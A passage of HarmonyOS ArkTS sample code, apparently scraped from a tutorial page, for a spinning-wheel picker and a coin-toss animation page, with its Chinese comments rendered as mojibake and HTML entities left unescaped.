è®¾ç½®é«˜åº¦ .borderRadius(&#x27;50%&#x27;) // è®¾ç½®åœ†è§’ .translate(&#123; x: `$&#123;this.calculateBallPosition().x&#125;lpx`, // è®¾ç½®Xè½´åç§» y: `$&#123;this.calculateBallPosition().y&#125;lpx` // è®¾ç½®Yè½´åç§» &#125;) .animation(&#123; curve: Curve.EaseOut &#125;); // è®¾ç½®åŠ¨ç”»æ•ˆæœ &#125;.width(&#x27;580lpx&#x27;).height(&#x27;580lpx&#x27;).borderRadius(&#x27;50%&#x27;) // è®¾ç½®å¤–éƒ¨å¤§åœ†çš„å®½åº¦ã€é«˜åº¦å’Œåœ†è§’ &#125;.height(&#x27;100%&#x27;) // è®¾ç½®Stackçš„é«˜åº¦ .width(&#x27;100%&#x27;) // è®¾ç½®Stackçš„å®½åº¦ .backgroundColor(&quot;#18181a&quot;); // è®¾ç½®èƒŒæ™¯é¢œè‰² &#125;&#125; turntableè½¬ç›˜ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253import &#123; CounterComponent, CounterType &#125; from &#x27;@kit.ArkUI&#x27;; // å¯¼å…¥è®¡æ•°å™¨ç»„ä»¶å’Œè®¡æ•°å™¨ç±»å‹ // å®šä¹‰æ‰‡å½¢ç»„ä»¶@Componentstruct Sector &#123; @Prop radius: number; // æ‰‡å½¢çš„åŠå¾„ @Prop angle: number; // æ‰‡å½¢çš„è§’åº¦ @Prop color: string; // æ‰‡å½¢çš„é¢œè‰² // åˆ›å»ºæ‰‡å½¢è·¯å¾„çš„å‡½æ•° createSectorPath(radius: number, angle: number): string &#123; const centerX = radius / 2; // è®¡ç®—æ‰‡å½¢ä¸­å¿ƒçš„Xåæ ‡ const centerY = radius / 2; // è®¡ç®—æ‰‡å½¢ä¸­å¿ƒçš„Yåæ ‡ const startX = centerX; // æ‰‡å½¢èµ·å§‹ç‚¹çš„Xåæ ‡ const startY = centerY - radius; // æ‰‡å½¢èµ·å§‹ç‚¹çš„Yåæ ‡ const halfAngle = angle / 4; // è®¡ç®—åŠä¸ªè§’åº¦ // è®¡ç®—æ‰‡å½¢ç»“æŸç‚¹1çš„åæ ‡ const endX1 = centerX + radius * Math.cos((halfAngle * Math.PI) / 180); const endY1 = centerY - radius * Math.sin((halfAngle * Math.PI) / 180); // è®¡ç®—æ‰‡å½¢ç»“æŸç‚¹2çš„åæ ‡ const endX2 = centerX + radius * Math.cos((-halfAngle * Math.PI) / 180); const endY2 = centerY - radius * Math.sin((-halfAngle * Math.PI) / 180); // åˆ¤æ–­æ˜¯å¦ä¸ºå¤§å¼§ const largeArcFlag = angle / 2 &gt; 180 ? 1 : 0; const sweepFlag = 1; // è®¾ç½®å¼§çº¿æ–¹å‘ä¸ºé¡ºæ—¶é’ˆ // ç”ŸæˆSVGè·¯å¾„å‘½ä»¤ const pathCommands = `M$&#123;startX&#125; $&#123;startY&#125; A$&#123;radius&#125; $&#123;radius&#125; 0 $&#123;largeArcFlag&#125; $&#123;sweepFlag&#125; $&#123;endX1&#125; $&#123;endY1&#125; L$&#123;centerX&#125; $&#123;centerY&#125; L$&#123;endX2&#125; $&#123;endY2&#125; A$&#123;radius&#125; $&#123;radius&#125; 0 $&#123;largeArcFlag&#125; $&#123;1 - sweepFlag&#125; $&#123;startX&#125; $&#123;startY&#125; Z`; return pathCommands; // è¿”å›è·¯å¾„å‘½ä»¤ &#125; // æ„å»ºæ‰‡å½¢ç»„ä»¶ build() &#123; Stack() &#123; // åˆ›å»ºç¬¬ä¸€ä¸ªæ‰‡å½¢è·¯å¾„ Path() .width(`$&#123;this.radius&#125;px`) // è®¾ç½®å®½åº¦ä¸ºåŠå¾„ .height(`$&#123;this.radius&#125;px`) // è®¾ç½®é«˜åº¦ä¸ºåŠå¾„ .commands(this.createSectorPath(this.radius, this.angle)) // è®¾ç½®è·¯å¾„å‘½ä»¤ .fillOpacity(1) // è®¾ç½®å¡«å……é€æ˜åº¦ .fill(this.color) // è®¾ç½®å¡«å……é¢œè‰² .strokeWidth(0) // è®¾ç½®è¾¹æ¡†å®½åº¦ä¸º0 .rotate(&#123; angle: this.angle / 4 - 90 &#125;); // æ—‹è½¬æ‰‡å½¢ // åˆ›å»ºç¬¬äºŒä¸ªæ‰‡å½¢è·¯å¾„ Path() .width(`$&#123;this.radius&#125;px`) // è®¾ç½®å®½åº¦ä¸ºåŠå¾„ .height(`$&#123;this.radius&#125;px`) // è®¾ç½®é«˜åº¦ä¸ºåŠå¾„ .commands(this.createSectorPath(this.radius, this.angle)) // è®¾ç½®è·¯å¾„å‘½ä»¤ .fillOpacity(1) // è®¾ç½®å¡«å……é€æ˜åº¦ .fill(this.color) // è®¾ç½®å¡«å……é¢œè‰² .strokeWidth(0) // è®¾ç½®è¾¹æ¡†å®½åº¦ä¸º0 .rotate(&#123; angle: 180 - (this.angle / 4 - 90) &#125;); // æ—‹è½¬æ‰‡å½¢ &#125; &#125;&#125; // å®šä¹‰å•å…ƒæ ¼ç±»@ObservedV2class Cell &#123; @Trace angle: number = 0; // æ‰‡å½¢çš„è§’åº¦ @Trace title: string; // å½“å‰æ ¼å­çš„æ ‡é¢˜ @Trace color: string; // èƒŒæ™¯é¢œè‰² @Trace rotate: number = 0; // åœ¨è½¬ç›˜è¦æ—‹è½¬çš„è§’åº¦ angleStart: number = 0; // è½®ç›˜æ‰€åœ¨åŒºé—´çš„èµ·å§‹ angleEnd: number = 0; // è½®ç›˜æ‰€åœ¨åŒºé—´çš„ç»“æŸ proportion: number = 0; // æ‰€å æ¯”ä¾‹ // æ„é€ å‡½æ•° constructor(proportion: number, title: string, color: string) &#123; this.proportion = proportion; // è®¾ç½®æ¯”ä¾‹ this.title = title; // è®¾ç½®æ ‡é¢˜ this.color = color; // è®¾ç½®é¢œè‰² &#125;&#125; // å®šä¹‰è½¬ç›˜ç»„ä»¶@Entry@Componentstruct Wheel &#123; @State cells: Cell[] = []; // å­˜å‚¨å•å…ƒæ ¼çš„æ•°ç»„ @State wheelWidth: number = 600; // è½¬ç›˜çš„å®½åº¦ @State currentAngle: number = 0; // å½“å‰è½¬ç›˜çš„è§’åº¦ @State selectedName: string = &quot;&quot;; // é€‰ä¸­çš„åç§° isAnimating: boolean = false; // åŠ¨ç”»çŠ¶æ€ colorIndex: number = 0; // é¢œè‰²ç´¢å¼• colorPalette: string[] = [ // é¢œè‰²è°ƒè‰²æ¿ &quot;#26c2ff&quot;, &quot;#978efe&quot;, &quot;#c389fe&quot;, &quot;#ff85bd&quot;, &quot;#ff7051&quot;, &quot;#fea800&quot;, &quot;#ffcf18&quot;, &quot;#a9c92a&quot; ]; // ç»„ä»¶å³å°†å‡ºç°æ—¶è°ƒç”¨ aboutToAppear(): void &#123; // åˆå§‹åŒ–å•å…ƒæ ¼ this.cells.push(new Cell(1, &quot;è·‘æ­¥&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(2, &quot;è·³ç»³&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(1, &quot;å”±æ­Œ&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.cells.push(new Cell(4, &quot;è·³èˆ&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.calculateAngles(); // è®¡ç®—è§’åº¦ &#125; // è®¡ç®—æ¯ä¸ªå•å…ƒæ ¼çš„è§’åº¦ private calculateAngles() &#123; // æ ¹æ®æ¯”ä¾‹è®¡ç®—æ€»æ¯”ä¾‹ const totalProportion = this.cells.reduce((sum, cell) =&gt; sum + cell.proportion, 0); this.cells.forEach(cell =&gt; &#123; cell.angle = (cell.proportion * 360) / totalProportion; // è®¡ç®—æ¯ä¸ªå•å…ƒæ ¼çš„è§’åº¦ &#125;); let cumulativeAngle = 0; // ç´¯è®¡è§’åº¦ this.cells.forEach(cell =&gt; &#123; cell.angleStart = cumulativeAngle; // è®¾ç½®èµ·å§‹è§’åº¦ cumulativeAngle += cell.angle; // æ›´æ–°ç´¯è®¡è§’åº¦ cell.angleEnd = cumulativeAngle; // è®¾ç½®ç»“æŸè§’åº¦ cell.rotate = cumulativeAngle - (cell.angle / 2); // è®¡ç®—æ—‹è½¬è§’åº¦ &#125;); &#125; // æ„å»ºè½¬ç›˜ç»„ä»¶ build() &#123; Column() &#123; Row() &#123; Text(&#x27;è½¬ç›˜&#x27;).fontSize(20).fontColor(&quot;#0b0e15&quot;); // æ˜¾ç¤ºè½¬ç›˜æ ‡é¢˜ &#125;.width(&#x27;100%&#x27;).height(44).justifyContent(FlexAlign.Center); // è®¾ç½®è¡Œçš„å®½åº¦å’Œé«˜åº¦ // æ˜¾ç¤ºå½“å‰çŠ¶æ€ Text(this.isAnimating ? &#x27;æ—‹è½¬ä¸­&#x27; : `$&#123;this.selectedName&#125;`).fontSize(20).fontColor(&quot;#0b0e15&quot;).height(40); Stack() &#123; Stack() &#123; // éå†æ¯ä¸ªå•å…ƒæ ¼å¹¶ç»˜åˆ¶æ‰‡å½¢ ForEach(this.cells, (cell: Cell) =&gt; &#123; Stack() &#123; Sector(&#123; radius: lpx2px(this.wheelWidth) / 2, angle: cell.angle, color: cell.color &#125;); // åˆ›å»ºæ‰‡å½¢ Text(cell.title).fontColor(Color.White).margin(&#123; bottom: `$&#123;this.wheelWidth / 1.4&#125;lpx` &#125;); // æ˜¾ç¤ºå•å…ƒæ ¼æ ‡é¢˜ &#125;.width(&#x27;100%&#x27;).height(&#x27;100%&#x27;).rotate(&#123; angle: cell.rotate &#125;); // è®¾ç½®å®½åº¦å’Œé«˜åº¦ï¼Œå¹¶æ—‹è½¬ &#125;); &#125; .borderRadius(&#x27;50%&#x27;) // è®¾ç½®åœ†è§’ .backgroundColor(Color.Gray) // è®¾ç½®èƒŒæ™¯é¢œè‰² .width(`$&#123;this.wheelWidth&#125;lpx`) // è®¾ç½®è½¬ç›˜å®½åº¦ .height(`$&#123;this.wheelWidth&#125;lpx`) // è®¾ç½®è½¬ç›˜é«˜åº¦ .rotate(&#123; angle: this.currentAngle &#125;); // æ—‹è½¬è½¬ç›˜ // åˆ›å»ºæŒ‡é’ˆ Polygon(&#123; width: 20, height: 10 &#125;) .points([[0, 0], [10, -20], [20, 0]]) // è®¾ç½®æŒ‡é’ˆçš„ç‚¹ .fill(&quot;#d72b0b&quot;) // è®¾ç½®æŒ‡é’ˆé¢œè‰² .height(20) // è®¾ç½®æŒ‡é’ˆé«˜åº¦ .margin(&#123; bottom: &#x27;140lpx&#x27; &#125;); // è®¾ç½®æŒ‡é’ˆåº•éƒ¨è¾¹è· // åˆ›å»ºå¼€å§‹æŒ‰é’® Button(&#x27;å¼€å§‹&#x27;) .fontColor(&quot;#c53a2c&quot;) // è®¾ç½®æŒ‰é’®å­—ä½“é¢œè‰² .borderWidth(10) // è®¾ç½®æŒ‰é’®è¾¹æ¡†å®½åº¦ .borderColor(&quot;#dd2218&quot;) // è®¾ç½®æŒ‰é’®è¾¹æ¡†é¢œè‰² .backgroundColor(&quot;#fde427&quot;) // è®¾ç½®æŒ‰é’®èƒŒæ™¯é¢œè‰² .width(&#x27;200lpx&#x27;) // è®¾ç½®æŒ‰é’®å®½åº¦ .height(&#x27;200lpx&#x27;) // è®¾ç½®æŒ‰é’®é«˜åº¦ .borderRadius(&#x27;50%&#x27;) // è®¾ç½®æŒ‰é’®ä¸ºåœ†å½¢ .clickEffect(&#123; level: ClickEffectLevel.LIGHT &#125;) // è®¾ç½®ç‚¹å‡»æ•ˆæœ .onClick(() =&gt; &#123; // ç‚¹å‡»æŒ‰é’®æ—¶çš„å›è°ƒå‡½æ•° if (this.isAnimating) &#123; // å¦‚æœæ­£åœ¨åŠ¨ç”»ä¸­ï¼Œè¿”å› return; &#125; this.selectedName = &quot;&quot;; // æ¸…ç©ºé€‰ä¸­çš„åç§° this.isAnimating = true; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºæ­£åœ¨åŠ¨ç”» animateTo(&#123; // å¼€å§‹åŠ¨ç”» duration: 5000, // åŠ¨ç”»æŒç»­æ—¶é—´ä¸º5000æ¯«ç§’ curve: Curve.EaseInOut, // åŠ¨ç”»æ›²çº¿ä¸ºç¼“å…¥ç¼“å‡º onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ this.currentAngle %= 360; // ä¿æŒå½“å‰è§’åº¦åœ¨0åˆ°360ä¹‹é—´ for (const cell of this.cells) &#123; // éå†æ¯ä¸ªå•å…ƒæ ¼ // æ£€æŸ¥å½“å‰è§’åº¦æ˜¯å¦åœ¨å•å…ƒæ ¼çš„è§’åº¦èŒƒå›´å†… if (360 - this.currentAngle &gt;= cell.angleStart &amp;&amp; 360 - this.currentAngle &lt;= cell.angleEnd) &#123; this.selectedName = cell.title; // è®¾ç½®é€‰ä¸­çš„åç§°ä¸ºå½“å‰å•å…ƒæ ¼çš„æ ‡é¢˜ break; // æ‰¾åˆ°åé€€å‡ºå¾ªç¯ &#125; &#125; this.isAnimating = false; // è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºæœªåŠ¨ç”» &#125;, &#125;, () =&gt; &#123; // åŠ¨ç”»è¿›è¡Œä¸­çš„å›è°ƒ this.currentAngle += (360 * 5 + Math.floor(Math.random() * 360)); // æ›´æ–°å½“å‰è§’åº¦ï¼Œå¢åŠ éšæœºæ—‹è½¬ &#125;); &#125;); &#125; // åˆ›å»ºæ»šåŠ¨åŒºåŸŸ Scroll() &#123; Column() &#123; // éå†æ¯ä¸ªå•å…ƒæ ¼ï¼Œåˆ›å»ºè¾“å…¥æ¡†å’Œè®¡æ•°å™¨ ForEach(this.cells, (item: Cell, index: number) =&gt; &#123; Row() &#123; // åˆ›å»ºæ–‡æœ¬è¾“å…¥æ¡†ï¼Œæ˜¾ç¤ºå•å…ƒæ ¼æ ‡é¢˜ TextInput(&#123; text: item.title &#125;) .layoutWeight(1) // è®¾ç½®è¾“å…¥æ¡†å æ®å‰©ä½™ç©ºé—´ .onChange((value) =&gt; &#123; // è¾“å…¥æ¡†å†…å®¹å˜åŒ–æ—¶çš„å›è°ƒ item.title = value; // æ›´æ–°å•å…ƒæ ¼æ ‡é¢˜ &#125;); // åˆ›å»ºè®¡æ•°å™¨ç»„ä»¶ CounterComponent(&#123; options: &#123; type: CounterType.COMPACT, // è®¾ç½®è®¡æ•°å™¨ç±»å‹ä¸ºç´§å‡‘å‹ numberOptions: &#123; label: `å½“å‰å æ¯”`, // è®¾ç½®è®¡æ•°å™¨æ ‡ç­¾ value: item.proportion, // è®¾ç½®è®¡æ•°å™¨åˆå§‹å€¼ min: 1, // è®¾ç½®æœ€å°å€¼ max: 100, // è®¾ç½®æœ€å¤§å€¼ step: 1, // è®¾ç½®æ­¥é•¿ onChange: (value: number) =&gt; &#123; // è®¡æ•°å™¨å€¼å˜åŒ–æ—¶çš„å›è°ƒ item.proportion = value; // æ›´æ–°å•å…ƒæ ¼çš„æ¯”ä¾‹ this.calculateAngles(); // é‡æ–°è®¡ç®—è§’åº¦ &#125; &#125; &#125; &#125;); // åˆ›å»ºåˆ é™¤æŒ‰é’® Button(&#x27;åˆ é™¤&#x27;).onClick(() =&gt; &#123; this.cells.splice(index, 1); // ä»å•å…ƒæ ¼æ•°ç»„ä¸­åˆ é™¤å½“å‰å•å…ƒæ ¼ this.calculateAngles(); // é‡æ–°è®¡ç®—è§’åº¦ &#125;); &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.SpaceBetween) // è®¾ç½®è¡Œçš„å®½åº¦å’Œå†…å®¹å¯¹é½æ–¹å¼ .padding(&#123; left: 40, right: 40 &#125;); // è®¾ç½®å·¦å³å†…è¾¹è· &#125;); &#125;.layoutWeight(1); // è®¾ç½®æ»šåŠ¨åŒºåŸŸå æ®å‰©ä½™ç©ºé—´ &#125;.layoutWeight(1) // è®¾ç½®æ»šåŠ¨åŒºåŸŸå æ®å‰©ä½™ç©ºé—´ .margin(&#123; top: 20, bottom: 20 &#125;) // è®¾ç½®ä¸Šä¸‹å¤–è¾¹è· .align(Alignment.Top); // è®¾ç½®å¯¹é½æ–¹å¼ä¸ºé¡¶éƒ¨å¯¹é½ // åˆ›å»ºæ·»åŠ æ–°å†…å®¹æŒ‰é’® Button(&#x27;æ·»åŠ æ–°å†…å®¹&#x27;).onClick(() =&gt; &#123; // å‘å•å…ƒæ ¼æ•°ç»„ä¸­æ·»åŠ æ–°å•å…ƒæ ¼ this.cells.push(new Cell(1, &quot;æ–°å†…å®¹&quot;, this.colorPalette[this.colorIndex++ % this.colorPalette.length])); this.calculateAngles(); // é‡æ–°è®¡ç®—è§’åº¦ &#125;).margin(&#123; top: 20, bottom: 20 &#125;); // è®¾ç½®æŒ‰é’®çš„ä¸Šä¸‹å¤–è¾¹è· &#125; .height(&#x27;100%&#x27;) // è®¾ç½®ç»„ä»¶é«˜åº¦ä¸º100% .width(&#x27;100%&#x27;) // è®¾ç½®ç»„ä»¶å®½åº¦ä¸º100% .backgroundColor(&quot;#f5f8ff&quot;); // è®¾ç½®ç»„ä»¶èƒŒæ™¯é¢œè‰² &#125;&#125; CoinæŠ•ç¡¬å¸ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224// å®šä¹‰åœ°é¼ ç»„ä»¶@Componentstruct Hamster &#123; @Prop cellWidth: number // å•å…ƒæ ¼å®½åº¦ build() &#123; Stack() &#123; // åˆ›å»ºä¸€ä¸ªå †å å¸ƒå±€ // èº«ä½“ Text() .width(`$&#123;this.cellWidth / 2&#125;lpx`)// å®½åº¦ä¸ºå•å…ƒæ ¼å®½åº¦çš„ä¸€åŠ .height(`$&#123;this.cellWidth / 3 * 2&#125;lpx`)// é«˜åº¦ä¸ºå•å…ƒæ ¼é«˜åº¦çš„2/3 .backgroundColor(&quot;#b49579&quot;)// èƒŒæ™¯é¢œè‰² .borderRadius(&#123; topLeft: &#x27;50%&#x27;, topRight: &#x27;50%&#x27; &#125;)// åœ†è§’ .borderColor(&quot;#2a272d&quot;)// è¾¹æ¡†é¢œè‰² .borderWidth(1) // è¾¹æ¡†å®½åº¦ // å˜´å·´ Ellipse() .width(`$&#123;this.cellWidth / 4&#125;lpx`)// å˜´å·´çš„å®½åº¦ .height(`$&#123;this.cellWidth / 5&#125;lpx`)// å˜´å·´çš„é«˜åº¦ .fillOpacity(1)// å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#e7bad7&quot;)// å¡«å……é¢œè‰² .stroke(&quot;#563e3f&quot;)// è¾¹æ¡†é¢œè‰² .strokeWidth(1)// è¾¹æ¡†å®½åº¦ .margin(&#123; top: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // ä¸Šè¾¹è· // å·¦çœ¼ç› Ellipse() .width(`$&#123;this.cellWidth / 9&#125;lpx`)// å·¦çœ¼ç›çš„å®½åº¦ .height(`$&#123;this.cellWidth / 6&#125;lpx`)// å·¦çœ¼ç›çš„é«˜åº¦ .fillOpacity(1)// å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#313028&quot;)// å¡«å……é¢œè‰² .stroke(&quot;#2e2018&quot;)// è¾¹æ¡†é¢œè‰² .strokeWidth(1)// è¾¹æ¡†å®½åº¦ .margin(&#123; bottom: `$&#123;this.cellWidth / 3&#125;lpx`, right: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // ä¸‹è¾¹è·å’Œå³è¾¹è· // å³çœ¼ç› Ellipse() .width(`$&#123;this.cellWidth / 9&#125;lpx`)// å³çœ¼ç›çš„å®½åº¦ .height(`$&#123;this.cellWidth / 6&#125;lpx`)// å³çœ¼ç›çš„é«˜åº¦ .fillOpacity(1)// å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#313028&quot;)// å¡«å……é¢œè‰² .stroke(&quot;#2e2018&quot;)// è¾¹æ¡†é¢œè‰² .strokeWidth(1)// è¾¹æ¡†å®½åº¦ .margin(&#123; bottom: `$&#123;this.cellWidth / 3&#125;lpx`, left: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // ä¸‹è¾¹è·å’Œå·¦è¾¹è· // å·¦çœ¼ç³ Ellipse() .width(`$&#123;this.cellWidth / 20&#125;lpx`)// å·¦çœ¼ç³çš„å®½åº¦ .height(`$&#123;this.cellWidth / 15&#125;lpx`)// å·¦çœ¼ç³çš„é«˜åº¦ .fillOpacity(1)// å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#fefbfa&quot;)// å¡«å……é¢œè‰² .margin(&#123; bottom: `$&#123;this.cellWidth / 2.5&#125;lpx`, right: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // ä¸‹è¾¹è·å’Œå³è¾¹è· // å³çœ¼ç³ Ellipse() .width(`$&#123;this.cellWidth / 20&#125;lpx`)// å³çœ¼ç³çš„å®½åº¦ .height(`$&#123;this.cellWidth / 15&#125;lpx`)// å³çœ¼ç³çš„é«˜åº¦ .fillOpacity(1)// å¡«å……ä¸é€æ˜åº¦ .fill(&quot;#fefbfa&quot;)// å¡«å……é¢œè‰² .margin(&#123; bottom: `$&#123;this.cellWidth / 2.5&#125;lpx`, left: `$&#123;this.cellWidth / 6&#125;lpx` &#125;) // ä¸‹è¾¹è·å’Œå·¦è¾¹è· &#125;.width(`$&#123;this.cellWidth&#125;lpx`).height(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®ç»„ä»¶çš„å®½åº¦å’Œé«˜åº¦ &#125;&#125; // å®šä¹‰é¡µé¢ç»„ä»¶@Entry@Componentstruct CoinTossPage &#123; @State cellWidth: number = 50 // å•å…ƒæ ¼å®½åº¦ @State headsCount: number = 0 // æ­£é¢æœä¸Šçš„æ¬¡æ•° @State tailsCount: number = 0 // åé¢æœä¸Šçš„æ¬¡æ•° @State rotationAngle: number = 0 // æ—‹è½¬è§’åº¦ @State verticalOffset: number = 0 // çºµå‘ä½ç§» @State isAnimRun: boolean = false // åŠ¨ç”»æ˜¯å¦æ­£åœ¨æ‰§è¡Œ build() &#123; Column() &#123; // é¡µé¢æ ‡é¢˜ Text(&#x27;æŠ›ç¡¬å¸&#x27;) .height(50)// é«˜åº¦è®¾ç½®ä¸º50 .width(&#x27;100%&#x27;)// å®½åº¦è®¾ç½®ä¸º100% .textAlign(TextAlign.Center)// æ–‡æœ¬å±…ä¸­å¯¹é½ .fontColor(&quot;#fefefe&quot;)// å­—ä½“é¢œè‰² .fontSize(20); // å­—ä½“å¤§å° // æ˜¾ç¤ºåœ°é¼ å’Œè®¡æ•° Row(&#123; space: 20 &#125;) &#123; Stack() &#123; Hamster(&#123; cellWidth: this.cellWidth &#125;) // åˆ›å»ºåœ°é¼ ç»„ä»¶ &#125; .borderRadius(&#x27;50%&#x27;) // è®¾ç½®åœ†è§’ .width(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®å®½åº¦ .height(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®é«˜åº¦ .linearGradient(&#123; // è®¾ç½®çº¿æ€§æ¸å˜èƒŒæ™¯ direction: GradientDirection.LeftBottom, colors: [[&#x27;#ebcf2f&#x27;, 0.0], [&#x27;#fef888&#x27;, 0.5], [&#x27;#ebcf2f&#x27;, 1.0]] &#125;); // æ˜¾ç¤ºåé¢æœä¸Šçš„æ¬¡æ•° Text(`$&#123;this.tailsCount&#125;`) .fontSize(20) .fontColor(&quot;#fefefe&quot;); Stack() &#123; // æ˜¾ç¤º100 Text(&quot;100&quot;) .fontColor(&quot;#9f7606&quot;) .fontSize(`$&#123;this.cellWidth / 2&#125;lpx`); &#125; .borderRadius(&#x27;50%&#x27;) // è®¾ç½®åœ†è§’ .width(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®å®½åº¦ .height(`$&#123;this.cellWidth&#125;lpx`) // è®¾ç½®é«˜åº¦ .linearGradient(&#123; // è®¾ç½®çº¿æ€§æ¸å˜èƒŒæ™¯ direction: GradientDirection.LeftBottom, colors: [[&#x27;#ebcf2f&#x27;, 0.0], [&#x27;#fef888&#x27;, 0.5], [&#x27;#ebcf2f&#x27;, 1.0]] &#125;); // æ˜¾ç¤ºæ­£é¢æœä¸Šçš„æ¬¡æ•° Text(`$&#123;this.headsCount&#125;`) .fontSize(20) .fontColor(&quot;#fefefe&quot;); &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.Center); // è®¾ç½®å®½åº¦å’Œå†…å®¹å±…ä¸­å¯¹é½ Stack() &#123; Stack() &#123; // åˆ›å»ºæ”¾å¤§ç‰ˆåœ°é¼ ç»„ä»¶ Hamster(&#123; cellWidth: this.cellWidth * 3 &#125;) .visibility(this.isHeadsFaceUp() ? Visibility.Visible : Visibility.Hidden); // æ ¹æ®çŠ¶æ€æ˜¾ç¤ºæˆ–éšè— // æ˜¾ç¤º100 Text(&quot;100&quot;) .fontColor(&quot;#9f7606&quot;)// å­—ä½“é¢œè‰² .fontSize(`$&#123;this.cellWidth / 2 * 3&#125;lpx`)// å­—ä½“å¤§å° .visibility(!this.isHeadsFaceUp() ? Visibility.Visible : Visibility.Hidden)// æ ¹æ®çŠ¶æ€æ˜¾ç¤ºæˆ–éšè— .rotate(&#123; // æ—‹è½¬180åº¦ x: 1, y: 0, z: 0, angle: 180 &#125;); &#125; .borderRadius(&#x27;50%&#x27;) // è®¾ç½®åœ†è§’ .width(`$&#123;this.cellWidth * 3&#125;lpx`) // è®¾ç½®å®½åº¦ .height(`$&#123;this.cellWidth * 3&#125;lpx`) // è®¾ç½®é«˜åº¦ .linearGradient(&#123; // è®¾ç½®çº¿æ€§æ¸å˜èƒŒæ™¯ direction: GradientDirection.LeftBottom, colors: [[&#x27;#ebcf2f&#x27;, 0.0], [&#x27;#fef888&#x27;, 0.5], [&#x27;#ebcf2f&#x27;, 1.0]] &#125;) .rotate(&#123; // æ ¹æ®å½“å‰è§’åº¦æ—‹è½¬ x: 1, y: 0, z: 0, angle: this.rotationAngle &#125;) .translate(&#123; x: 0, y: this.verticalOffset &#125;) // è®¾ç½®çºµå‘ä½ç§» .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶å¤„ç† if (this.isAnimRun) &#123; return; &#125; this.isAnimRun = true let maxAnimationSteps = 2 * (10 + Math.floor(Math.random() * 10)); // è®¡ç®—æœ€å¤§åŠ¨ç”»æ¬¡æ•° let totalAnimationDuration = 2000; // åŠ¨ç”»æ€»æ—¶é•¿ // ç¬¬ä¸€æ¬¡åŠ¨ç”»ï¼Œå‘ä¸ŠæŠ›å‡º animateToImmediately(&#123; duration: totalAnimationDuration / 2, // åŠ¨ç”»æ—¶é•¿ä¸ºæ€»æ—¶é•¿çš„ä¸€åŠ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ // ç¬¬äºŒæ¬¡åŠ¨ç”»ï¼Œå‘ä¸‹è½ animateToImmediately(&#123; duration: totalAnimationDuration / 2, onFinish: () =&gt; &#123; this.rotationAngle = this.rotationAngle % 360; // ç¡®ä¿è§’åº¦åœ¨0åˆ°360ä¹‹é—´ // åˆ¤æ–­å½“å‰æ˜¾ç¤ºçš„é¢ if (this.isHeadsFaceUp()) &#123; // å¦‚æœæ˜¯åœ°é¼ é¢ this.tailsCount++; // åé¢æœä¸Šçš„æ¬¡æ•°åŠ 1 &#125; else &#123; // å¦‚æœæ˜¯åé¢ this.headsCount++; // æ­£é¢æœä¸Šçš„æ¬¡æ•°åŠ 1 &#125; this.isAnimRun = false &#125; &#125;, () =&gt; &#123; this.verticalOffset = 0; // é‡ç½®çºµå‘ä½ç§» &#125;); &#125; &#125;, () =&gt; &#123; // è®¾ç½®çºµå‘ä½ç§»ï¼Œæ¨¡æ‹ŸæŠ›ç¡¬å¸çš„æ•ˆæœ this.verticalOffset = -100 * (1 + Math.floor(Math.random() * 5)); // éšæœºè®¾ç½®å‘ä¸Šçš„ä½ç§» &#125;); // å¾ªç¯åŠ¨ç”»ï¼Œå¢åŠ æ—‹è½¬æ•ˆæœ for (let i = 0; i &lt; maxAnimationSteps; i++) &#123; animateToImmediately(&#123; delay: i * totalAnimationDuration / maxAnimationSteps, // è®¾ç½®æ¯æ¬¡åŠ¨ç”»çš„å»¶è¿Ÿ duration: 100, // æ¯æ¬¡åŠ¨ç”»çš„æŒç»­æ—¶é—´ onFinish: () =&gt; &#123; // åŠ¨ç”»å®Œæˆåçš„å›è°ƒ &#125; &#125;, () =&gt; &#123; this.rotationAngle += 90; // æ¯æ¬¡å¢åŠ 90åº¦æ—‹è½¬ &#125;); &#125; &#125;); &#125;.width(&#x27;100%&#x27;).layoutWeight(1).align(Alignment.Bottom).padding(&#123; bottom: 80 &#125;); // è®¾ç½®ç»„ä»¶çš„å®½åº¦ã€æƒé‡ã€å¯¹é½æ–¹å¼å’Œåº•éƒ¨å†…è¾¹è· &#125; .height(&#x27;100%&#x27;) // è®¾ç½®æ•´ä¸ªé¡µé¢çš„é«˜åº¦ .width(&#x27;100%&#x27;) // è®¾ç½®æ•´ä¸ªé¡µé¢çš„å®½åº¦ .backgroundColor(&quot;#0b0d0c&quot;); // 